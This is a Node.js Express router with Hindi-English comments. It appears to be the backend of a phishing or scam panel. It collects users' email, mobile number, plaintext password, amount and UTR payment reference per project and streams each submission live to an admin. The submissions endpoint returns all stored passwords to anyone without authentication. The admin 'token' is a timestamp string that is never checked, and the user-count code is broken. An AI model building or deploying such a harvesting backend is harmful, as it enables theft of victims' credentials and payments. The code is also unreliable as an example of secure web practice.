const express = require('express');
const { Submission } = require('./database');
const { emitNewSubmission } = require('./socket');
const router = express.Router();

// ✅ Submit new form data (User Panel se)
router.post('/api/submit', async (req, res) => {
  try {
    const { 
      projectId, type, email, mobile, password, amount, utr,
      ipAddress, userAgent 
    } = req.body;

    if (!projectId || !type || !email || !mobile || !password || !amount) {
      return res.status(400).json({ success: false, message: 'Missing required fields' });
    }

    const newSubmission = new Submission({
      projectId,
      type,
      email,
      mobile,
      password,
      amount,
      utr: type === 'deposit' ? utr : null,
      ipAddress,
      userAgent
    });

    await newSubmission.save();
    
    // Realtime update admin ko bhejo
    emitNewSubmission(projectId, newSubmission);

    res.status(201).json({ 
      success: true, 
      message: 'Data saved successfully', 
      id: newSubmission._id 
    });

  } catch (error) {
    console.error('❌ Submit Error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ✅ Admin Login
router.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;
  
  if (username === process.env.ADMIN_USER && password === process.env.ADMIN_PASS) {
    res.json({ 
      success: true, 
      token: 'admin_token_' + Date.now(),
      message: 'Login successful' 
    });
  } else {
    res.status(401).json({ success: false, message: 'Invalid credentials' });
  }
});

// ✅ Get all submissions for admin
router.get('/api/submissions/:projectId', async (req, res) => {
  try {
    const { projectId } = req.params;
    const { date } = req.query; // Optional: filter by date
    
    let query = { projectId };
    
    if (date === 'today') {
      const startOfDay = new Date();
      startOfDay.setHours(0, 0, 0, 0);
      query.submittedAt = { $gte: startOfDay };
    }

    const submissions = await Submission.find(query)
      .sort({ submittedAt: -1 })
      .limit(100);

    // Stats calculate karein
    const totalUsers = await Submission.distinct('email', { projectId }).countDocuments();
    const todayUsers = await Submission.distinct('email', { 
      projectId, 
      submittedAt: { $gte: new Date(new Date().setHours(0,0,0,0)) }
    }).countDocuments();

    res.json({
      success: true,
      data: submissions,
      stats: { totalUsers, todayUsers }
    });

  } catch (error) {
    console.error('❌ Fetch Error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ✅ Health check
router.get('/api/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

module.exports = router;